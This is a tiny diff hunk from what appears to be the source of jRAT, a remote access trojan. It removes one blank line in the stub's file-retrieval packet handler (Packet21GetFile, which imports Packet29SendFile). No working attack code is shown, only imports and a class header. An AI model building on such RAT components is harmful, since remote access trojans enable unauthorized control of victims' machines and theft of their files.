@@ -7,7 +7,6 @@ import pro.jrat.stub.Connection;
 import pro.jrat.stub.Main;
 import pro.jrat.stub.packets.outgoing.Packet29SendFile;
 
-
 public class Packet21GetFile extends AbstractIncomingPacket {
 
 	@Override
